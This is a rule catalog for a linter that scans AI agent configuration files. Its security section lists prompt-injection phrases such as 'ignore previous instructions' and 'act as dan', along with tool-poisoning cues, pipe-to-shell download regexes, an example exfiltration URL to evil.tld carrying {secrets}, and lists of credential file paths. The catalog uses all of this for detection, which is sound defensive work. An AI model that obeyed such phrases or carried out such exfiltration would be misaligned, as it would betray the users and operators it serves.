@@ -1,0 +1,239 @@
+# 03 — Rule catalog
+
+## Conventions
+
+- ID: `AI-<CAT>-<NNN>`. CAT ∈ `SEC` (Security → Vulnerability), `STR` (Structure → Bug), `EFF` (Efficiency → Context smell), `COG` (Cognitive → Clarity smell). Numbers are never reused.
+- Severities: `Critical`, `High`, `Medium`, `Low`, `Info`. Defaults are listed per rule and can be overridden in `pulse.toml`.
+- **Scope**: `asset` rules implement `Rule`; `project` rules implement `ProjectRule` and see all assets.
+- **Kinds**: `all`, `md` (every Markdown-based kind), or explicit kinds.
+- Each rule ships: implementation, `fail_*`/`pass_*` fixtures, and `docs/rules/<ID>.md` (see the `add-rule` skill).
+- The **Phase** column says which roadmap phase implements the rule.
+
+## Index
+
+| ID | Name | Sev | Scope | Phase |
+|---|---|---|---|---|
+| AI-SEC-001 | Invisible or bidirectional Unicode | Critical | asset | 2 |
+| AI-SEC-002 | Prompt-injection phrase | Critical | asset | 2 |
+| AI-SEC-003 | Hardcoded secret | Critical | asset | 3 |
+| AI-SEC-004 | MCP credential not externalized | High | asset | 3 |
+| AI-SEC-005 | Unpinned MCP server package | High | asset | 3 |
+| AI-SEC-006 | Insecure MCP transport | High | asset | 3 |
+| AI-SEC-007 | Over-permissive agent permissions | High | asset | 3 |
+| AI-SEC-008 | Remote code execution in hook | Critical | asset | 3 |
+| AI-SEC-009 | Unsafe interpolation in hook command | High | asset | 3 |
+| AI-SEC-010 | Data-exfiltration pattern | High | asset | 3 |
+| AI-SEC-011 | Hidden instructions | High | asset | 3 |
+| AI-SEC-012 | Tool description poisoning | Critical | asset | 3 |
+| AI-SEC-013 | Sensitive path reference | Medium | asset | 3 |
+| AI-STR-001 | Invalid or missing frontmatter | High | asset | 4 |
+| AI-STR-002 | Invalid file content | High | asset | 2 |
+| AI-STR-003 | Broken reference or import | Medium | project | 4 |
+| AI-STR-004 | Name / description constraint violated | Medium | asset | 4 |
+| AI-STR-005 | Unknown tool in allow-list | Medium | asset | 4 |
+| AI-STR-006 | Invalid hook definition | High | asset | 4 |
+| AI-STR-007 | Duplicate asset name | High | project | 4 |
+| AI-EFF-001 | Asset over token budget | High | asset | 2 |
+| AI-EFF-002 | Always-on context over budget | High | project | 2 |
+| AI-EFF-003 | Duplicated content | Medium | project | 5 |
+| AI-EFF-004 | Inlined bulk content | Medium | asset | 5 |
+| AI-EFF-005 | MCP server/tool sprawl | Medium | project | 5 |
+| AI-EFF-006 | Oversized skill or agent | Medium | asset | 5 |
+| AI-EFF-007 | Filler phrasing | Low | asset | 5 |
+| AI-COG-001 | Contradictory directives | Medium | asset | 2 |
+| AI-COG-002 | Vague directive | Low | asset | 5 |
+| AI-COG-003 | Negative-only constraint | Info | asset | 5 |
+| AI-COG-004 | Emphasis inflation | Low | asset | 5 |
+| AI-COG-005 | Cross-file contradiction | Medium | project | 5 |
+| AI-COG-006 | Weak routing description | Medium | asset | 5 |
+| AI-COG-007 | Unstructured long instructions | Low | asset | 5 |
+
+---
+
+## Security (SEC)
+
+### AI-SEC-001 — Invisible or bidirectional Unicode
+- **Sev** Critical · **Kinds** all · **Inline-suppressible** no
+- **Detect** Code points: U+200B–U+200F, U+202A–U+202E, U+2060–U+2064, U+2066–U+2069, U+FEFF (except at offset 0), U+00AD, U+180E, tag block U+E0000–U+E007F ("ASCII smuggling"), and variation selectors U+FE00–U+FE0F / U+E0100–U+E01EF when not preceded by an emoji base. Single pass with `memchr` on lead bytes 0xE2/0xEF/0xF3/0xC2/0xE1, then decode.
+- **Report** One finding per contiguous run: `Invisible character(s) U+202E RIGHT-TO-LEFT OVERRIDE (×3)`. For tag-character runs, decode and include the hidden ASCII payload (truncated to 80 chars) in the message.
+- **Fix** Remove the characters. `pulse fix` (future) strips them automatically.
+- **FP guards** U+200D inside emoji ZWJ sequences (between two emoji code points) is allowed.
+
+### AI-SEC-002 — Prompt-injection phrase
+- **Sev** Critical · **Kinds** all except Settings · **Inline-suppressible** no
+- **Detect** Aho-Corasick over `normalized()` text with the `lexicon::INJECTION` list (≥ 40 phrases), e.g. "ignore (all) previous instructions", "disregard the above", "system override", "you are now in developer mode", "new instructions:", "forget everything", "do not tell the user", "act as dan", "</system>", "<|im_start|>", "[[system]]". Phrases are stored pre-normalized; small variants (all/any/prior/previous/above) are expanded at build time.
+- **Report** `Prompt-injection phrase "ignore previous instructions"`.
+- **FP guards** Skip matches inside fenced code blocks whose info string is `text`/`example`, and inside a section whose heading contains "injection" / "security" / "example attack" (this downgrades severity to Low, it does not drop the finding). Users can add allow-listed phrases in config.
+
+### AI-SEC-003 — Hardcoded secret
+- **Sev** Critical · **Kinds** all · **Inline-suppressible** no
+- **Detect** Regex set (`RegexSet` prefilter, then individual regexes for spans): AWS `AKIA[0-9A-Z]{16}`, GitHub `gh[pousr]_[A-Za-z0-9]{36,}` / `github_pat_…`, OpenAI `sk-(proj-)?[A-Za-z0-9_-]{20,}`, Anthropic `sk-ant-[A-Za-z0-9_-]{20,}`, Slack `xox[abprs]-…`, Google `AIza[0-9A-Za-z_-]{35}`, Stripe `sk_live_…`, private-key PEM headers, JWT `eyJ…\.eyJ…\.…`, plus generic `(api[_-]?key|token|secret|password)\s*[:=]\s*["']?([^\s"']{12,})` gated by Shannon entropy ≥ 3.5 bits/char.
+- **Report** `Possible <provider> secret`, with the secret redacted (first 4 chars + `…`).
+- **FP guards** Ignore obvious placeholders (`xxx`, `<…>`, `${…}`, `your-`, `example`, `dummy`, `changeme`, all-same-char).
+
+### AI-SEC-004 — MCP credential not externalized
+- **Sev** High · **Kinds** McpConfig
+- **Detect** A value in `env`, `headers` or `args` (after a `--token`/`--api-key`/`--password`-like flag) whose key matches `(?i)(key|token|secret|password|auth|bearer)` and whose value is a literal, i.e. not `${env:X}`, `${input:X}`, `${X}`, `$X` or empty.
+- **Fix** Reference an environment variable or VS Code `inputs` (`promptString`, `password: true`).
+- **Note** When AI-SEC-003 also fires on the same span, keep only AI-SEC-003 (the engine dedups by span with severity precedence).
+
+### AI-SEC-005 — Unpinned MCP server package
+- **Sev** High · **Kinds** McpConfig
+- **Detect** stdio servers whose command is `npx`/`pnpm dlx`/`bunx`/`yarn dlx` with a package arg lacking `@<version>` (or using `@latest`); `uvx`/`pipx run` without `==version` / `@version`; `docker run` with an image lacking a tag/digest or tagged `:latest`. Using `-y`/`--yes` adds "auto-install" to the message.
+- **Fix** Pin an exact version (or a digest for Docker).
+
+### AI-SEC-006 — Insecure MCP transport
+- **Sev** High · **Kinds** McpConfig
+- **Detect** HTTP/SSE server URL with scheme `http://` and host not in {`localhost`, `127.0.0.1`, `::1`, `*.localhost`}. Medium when the host is a private IP (RFC 1918).
+
+### AI-SEC-007 — Over-permissive agent permissions
+- **Sev** High · **Kinds** Settings, Agent, Prompt, McpConfig
+- **Detect**
+  - Settings: `permissions.allow` contains `Bash`, `Bash(*)`, `Bash(:*)`, or `*`; `WebFetch` without a domain; `defaultMode: "bypassPermissions"`; `enableAllProjectMcpServers: true` (Medium).
+  - Agent/Prompt frontmatter: `allowed-tools`/`tools` containing unrestricted `Bash`. This is Medium, because subagents legitimately use it, and High when combined with `WebFetch`/network tools (exfiltration chain).
+  - Any asset: text containing `--dangerously-skip-permissions` or `--yolo`.
+  - McpConfig: `alwaysAllow` / `autoApprove` lists containing write/exec tools or `*`.
+
+### AI-SEC-008 — Remote code execution in hook
+- **Sev** Critical · **Kinds** Settings, Hooks, Skill, Prompt · **Inline-suppressible** no
+- **Detect** In hook commands (and in fenced `bash`/`sh` blocks of skills/commands with `!` execution), match pipe-to-shell: `(curl|wget|iwr|Invoke-WebRequest)[^|]*\|\s*(sudo\s+)?(sh|bash|zsh|python3?|node|iex)`, `bash <(curl …)`, `eval "$(curl …)"`, plus base64 decode piped to a shell.
+
+### AI-SEC-009 — Unsafe interpolation in hook command
+- **Sev** High · **Kinds** Settings, Hooks
+- **Detect** Hook commands that interpolate tool input unquoted into a shell, e.g. `$(jq -r .tool_input.command)` or `$CLAUDE_FILE_PATHS` / `${file}` outside double quotes, or passed to `eval`/`sh -c`.
+- **Fix** Quote expansions; pass data via stdin or arguments; never `eval` tool input.
+
+### AI-SEC-010 — Data-exfiltration pattern
+- **Sev** High · **Kinds** md, Tools
+- **Detect** (a) Markdown images/links whose URL contains template placeholders or query params fed by context (`{…}`, `{{…}}`, `$…`, `<data>`), e.g. `![](https://evil.tld/?q={secrets})`; (b) imperative sentences that combine a send verb (`send`, `post`, `upload`, `exfiltrate`, `forward`, `include … in the url`) with a sensitive object (`env`, `secrets`, `credentials`, `api key`, `token`, `conversation`, `ssh`) within one sentence; (c) instructions to `curl`/`fetch` a non-allowlisted domain with data.
+- **Config** `allowed_domains`.
+
+### AI-SEC-011 — Hidden instructions
+- **Sev** High · **Kinds** md
+- **Detect** Content the model reads but a human reviewer may not see: HTML comments (`<!-- -->`) containing imperative directives (they start with a verb from `lexicon::IMPERATIVES`, or contain `you must`/`always`/`never`) or injection phrases; elements with `display:none` / `hidden`; base64 blobs ≥ 40 chars outside code fences; text-to-whitespace ratios suggesting padding (≥ 200 consecutive spaces/newlines followed by text).
+- **FP guards** Pulse suppression comments, markdownlint/prettier directives and license headers are ignored.
+
+### AI-SEC-012 — Tool description poisoning
+- **Sev** Critical · **Kinds** Tools, McpConfig (when inline tool metadata exists), Skill (frontmatter description)
+- **Detect** Tool or skill descriptions that contain injection phrases, `<IMPORTANT>`-style hidden-instruction tags, instructions to read files or credentials ("read ~/.ssh", "pass the contents of"), instructions to call other tools, or instructions to conceal behavior from the user ("do not mention", "don't tell the user").
+
+### AI-SEC-013 — Sensitive path reference
+- **Sev** Medium · **Kinds** all
+- **Detect** References to `~/.ssh`, `id_rsa`, `id_ed25519`, `~/.aws/credentials`, `.env` (as a read target, not in `.gitignore` advice), `/etc/passwd`, `/etc/shadow`, `~/.config/gh/hosts.yml`, `.npmrc`, `.pypirc`, keychain, browser profile directories.
+- **FP guards** Downgrade to Info inside deny-list contexts (`permissions.deny`, sentences containing "never read"/"do not access").
+
+---
+
+## Structure (STR)
+
+### AI-STR-001 — Invalid or missing frontmatter
+- **Sev** High · **Kinds** Skill, Agent, Prompt, ScopedInstructions
+- **Detect** YAML parse errors (report the YAML error line), unterminated `---`, or missing required keys. Required: Skill → `name`, `description`; Claude Agent → `name`, `description`; `.mdc` → at least one of `description`/`globs`/`alwaysApply`; `.instructions.md` → `applyTo`. Unknown keys → Low (typo hint via Levenshtein ≤ 2 against the known keys).
+
+### AI-STR-002 — Invalid file content
+- **Sev** High · **Kinds** all
+- **Detect** Invalid UTF-8 (lossy-decoded), JSON/JSONC parse error, wrong top-level shape for the kind (e.g. `mcpServers` not an object), files over `max_file_bytes` (Info, "skipped").
+
+### AI-STR-003 — Broken reference or import
+- **Sev** Medium · **Kinds** md · **Scope** project
+- **Detect** `@path` imports (CLAUDE.md), relative Markdown links, and paths in skill bodies (`scripts/x.py`, `references/y.md`) that do not exist relative to the asset (or to the root for `@/`). Skip URLs, anchors-only links and paths in code fences that look like examples (contain `<`, `your-`, `example`). Import cycles → High.
+
+### AI-STR-004 — Name / description constraint violated
+- **Sev** Medium · **Kinds** Skill, Agent, Prompt
+- **Detect** Skill `name` not matching `^[a-z0-9]+(-[a-z0-9]+)*$`, longer than 64 chars, or different from its directory name; `description` empty or longer than 1024 chars; reserved words in names (`anthropic`, `claude`) for skills.
+
+### AI-STR-005 — Unknown tool in allow-list
+- **Sev** Medium · **Kinds** Agent, Prompt, Settings
+- **Detect** `tools`/`allowed-tools`/permission entries naming a tool that is neither a known built-in (list in `lexicon::KNOWN_TOOLS`, per platform) nor `mcp__<server>__<tool>` with `<server>` defined in a discovered McpConfig. Levenshtein suggestion in the message.
+
+### AI-STR-006 — Invalid hook definition
+- **Sev** High · **Kinds** Settings, Hooks
+- **Detect** Unknown event name (vs `lexicon::HOOK_EVENTS`), missing `command`, `type` not in {`command`, `prompt`}, matcher that is not a valid regex, `timeout` ≤ 0 or > 600 s (Medium), a referenced script path (relative / `$CLAUDE_PROJECT_DIR/...`) that does not exist (Medium).
+
+### AI-STR-007 — Duplicate asset name
+- **Sev** High · **Kinds** Skill, Agent, Prompt · **Scope** project
+- **Detect** Two assets of the same kind and platform resolving to the same invocation name (skill `name`, agent `name`, command path → `/name`). Report on the second occurrence, pointing at the first.
+
+---
+
+## Efficiency (EFF)
+
+Every EFF finding sets `token_waste`, which feeds context debt (`04-scoring-gate.md`).
+
+### AI-EFF-001 — Asset over token budget
+- **Sev** High (Medium when ≤ 125% of budget) · **Kinds** all
+- **Detect** `tokens(asset) > budget(kind)`. Defaults (`[budgets]`): instructions 3000, scoped_instructions 1500, agent 2500, prompt 2000, skill 5000 (body), tools 3000, custom 3000.
+- **token_waste** `tokens - budget`.
+
+### AI-EFF-002 — Always-on context over budget
+- **Sev** High · **Scope** project
+- **Detect** Σ Always tokens (root instructions + resolved `@imports` + alwaysApply rules + skill/agent descriptions + tool schemas) > `budgets.always_on` (default 8000). The finding points at the largest contributor and lists the top 5 contributors with their tokens.
+- **token_waste** `total - budget`.
+
+### AI-EFF-003 — Duplicated content
+- **Sev** Medium · **Kinds** md · **Scope** project
+- **Detect** Paragraph-level near-duplicates within and across assets: 5-word shingles → xxh3 → 64-bit SimHash per paragraph (≥ 25 words); Hamming distance ≤ 3 means a duplicate. Exact duplicate lines (≥ 8 words) across always-on assets are also reported.
+- **token_waste** Tokens of the duplicate occurrence(s).
+
+### AI-EFF-004 — Inlined bulk content
+- **Sev** Medium · **Kinds** md
+- **Detect** In Always/Conditional assets: a fenced code block > 40 lines, a table > 25 rows, or a JSON/YAML dump > 60 lines. Suggest moving it to a referenced file (it is then loaded on demand).
+- **token_waste** Block tokens minus 20 (the cost of a reference line).
+
+### AI-EFF-005 — MCP server/tool sprawl
+- **Sev** Medium · **Scope** project
+- **Detect** Enabled MCP servers > `budgets.mcp_servers` (default 8), or tools in Tools assets > `budgets.tools` (default 40). Duplicate server definitions (same command+args or URL under different names) → High.
+
+### AI-EFF-006 — Oversized skill or agent
+- **Sev** Medium · **Kinds** Skill, Agent
+- **Detect** Skill body > 500 lines, or skill/agent `description` > `budgets.description` tokens (default 150). The description is always-on.
+- **token_waste** Description tokens over budget.
+
+### AI-EFF-007 — Filler phrasing
+- **Sev** Low · **Kinds** md
+- **Detect** `lexicon::FILLER` hits on normalized text ("please note that", "it is important to note", "make sure to always", "you are a helpful assistant", "as an ai", "in order to" → "to", "feel free to", "basically", "very very"). One aggregated finding per asset when there are ≥ 3 hits, listing the top phrases; otherwise one per hit at Info.
+- **token_waste** Σ (phrase tokens − replacement tokens).
+
+---
+
+## Cognitive (COG)
+
+### AI-COG-001 — Contradictory directives
+- **Sev** Medium · **Kinds** md
+- **Detect**
+  1. Split the body (outside code fences) into sentences or list items. A **directive** is a sentence with a polarity marker: positive {`always`, `must`, `should`, `use`, `prefer`, `do`} or negative {`never`, `must not`, `don't`, `do not`, `avoid`, `no`}. Extract the **object**: the 1–4 content words after the verb, with stop words removed and naive lemmas (strip plural `s`).
+  2. **Opposite polarity, same object** (e.g. "Always use semicolons" / "Never use semicolons") → finding.
+  3. **Mutually exclusive choices**: both members of a set in `lexicon::EXCLUSIVE_SETS` are prescribed positively (e.g. {typescript, javascript}, {tabs, spaces}, {npm, yarn, pnpm, bun}, {single quotes, double quotes}, {jest, vitest}, {snake_case, camelCase}) → finding. Users can extend this with `[rules.AI-COG-001] exclusive = [[...]]`.
+- **Report** On the second directive, referencing the first: `Contradicts line 12: "Always use TypeScript" vs "Use plain JavaScript"`.
+- **FP guards** Skip if either sentence has a scoping qualifier (`when`, `if`, `for`, `in`, `except`, `unless`, `only`) followed by different contexts, or if the two directives are in sections whose headings name different scopes (e.g. "Frontend" vs "Scripts").
+
+### AI-COG-002 — Vague directive
+- **Sev** Low · **Kinds** md
+- **Detect** Directive sentences containing `lexicon::VAGUE` terms ("appropriate(ly)", "as needed", "properly", "best practices", "clean code", "etc.", "and so on", "some", "reasonable", "if necessary", "good", "nice") without a concrete anchor (number, code span, path or example) in the same sentence. Aggregated per asset like AI-EFF-007.
+
+### AI-COG-003 — Negative-only constraint
+- **Sev** Info · **Kinds** md
+- **Detect** A negative directive (`don't`/`never`/`avoid` + object) with no positive alternative in the same or the next sentence (`instead`, `use`, `prefer`, `rather`).
+- **Fix** State what to do instead. Models follow positive instructions more reliably.
+
+### AI-COG-004 — Emphasis inflation
+- **Sev** Low · **Kinds** md
+- **Detect** Per asset: the share of directive sentences containing emphasis markers (`IMPORTANT`, `CRITICAL`, `MUST`, `NEVER` in caps, ≥ 2 `!`, a fully bold sentence, ALL-CAPS words ≥ 4 letters excluding acronyms in `lexicon::ACRONYMS`). Report when the share is > 25% and there are ≥ 4 emphasized directives. When everything is emphasized, nothing is.
+
+### AI-COG-005 — Cross-file contradiction
+- **Sev** Medium · **Scope** project
+- **Detect** AI-COG-001 logic applied across assets that load together: root Always instructions + `@imports` + alwaysApply rules, and per-directory chains (a nested `CLAUDE.md` with its ancestors). Reuses the directive extraction from AI-COG-001 (shared module `cognitive::directives`).
+
+### AI-COG-006 — Weak routing description
+- **Sev** Medium · **Kinds** Skill, Agent
+- **Detect** Description < 20 words, or lacking a trigger cue (`use when`, `use for`, `when the user`, `proactively`, `trigger`, `invoke`), or written in first person ("I can…"). The model routes on descriptions, so weak ones cause missed or wrong invocations.
+
+### AI-COG-007 — Unstructured long instructions
+- **Sev** Low · **Kinds** Instructions, ScopedInstructions, Agent, Skill
+- **Detect** Body > 60 lines with < 2 headings, or a paragraph > 150 words.
+
+---
+
+## Custom rules (declarative)
+
+Users define custom rules in `pulse.toml` (see `05-cli-config.md`). Each has an `id` (must start with `X-`), `severity`, `kinds`, `message`, and one matcher: `pattern` (regex on source), `phrases` (Aho-Corasick on normalized text), or `max_tokens`. They run through the same engine path as built-in rules.
